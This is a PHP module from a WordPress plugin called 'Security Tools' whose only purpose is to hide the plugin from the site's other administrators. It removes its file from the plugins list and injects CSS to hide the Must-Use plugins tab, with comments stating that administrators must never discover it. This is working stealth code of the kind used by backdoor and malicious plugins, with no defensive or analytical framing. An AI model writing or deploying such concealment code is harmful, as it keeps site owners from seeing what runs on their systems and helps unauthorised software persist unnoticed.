<?php
/**
 * Security Tools - Self-Hiding Feature
 *
 * Hides the Security Tools plugin from other administrators.
 * Removes it from the plugins list and hides the MU plugins tab.
 *
 * @package    Security_Tools
 * @subpackage Features
 * @version    2.5
 * @author     Carlos Rodríguez
 */

// Prevent direct access
defined( 'ABSPATH' ) || exit;

/**
 * Class Security_Tools_Feature_Self_Hiding
 *
 * Implements plugin self-hiding functionality.
 * This feature is always active - the plugin should never be visible to other admins.
 *
 * @since 1.2
 */
class Security_Tools_Feature_Self_Hiding {

    /**
     * Constructor - Register hooks
     *
     * @since 1.2
     */
    public function __construct() {
        // Hide from regular plugins list
        add_action( 'pre_current_active_plugins', array( $this, 'hide_from_plugins_list' ) );

        // Hide MU plugins tab
        add_action( 'admin_enqueue_scripts', array( $this, 'hide_mu_plugins_tab' ) );
    }

    /**
     * Hide this plugin from the plugins list table
     *
     * Removes security-tools.php from the plugins list before it's displayed.
     *
     * @since 1.2
     * @return void
     */
    public function hide_from_plugins_list() {
        global $wp_list_table;

        if ( ! isset( $wp_list_table->items ) || ! is_array( $wp_list_table->items ) ) {
            return;
        }

        // List of plugin files to hide
        $hidden_plugins = array( 'security-tools.php' );

        foreach ( $wp_list_table->items as $key => $val ) {
            if ( in_array( $key, $hidden_plugins, true ) ) {
                unset( $wp_list_table->items[ $key ] );
            }
        }
    }

    /**
     * Hide the Must-Use plugins tab on the plugins page
     *
     * Injects CSS to hide the MU plugins tab, preventing administrators
     * from discovering that MU plugins are installed.
     *
     * @since 1.2
     * @return void
     */
    public function hide_mu_plugins_tab() {
        // Only run on the plugins page
        $screen = get_current_screen();
        if ( ! $screen || $screen->id !== 'plugins' ) {
            return;
        }

        $css = 'li.mustuse { display: none !important; }';

        wp_register_style( 'security-tools-hide-mu', false );
        wp_enqueue_style( 'security-tools-hide-mu' );
        wp_add_inline_style( 'security-tools-hide-mu', $css );
    }
}
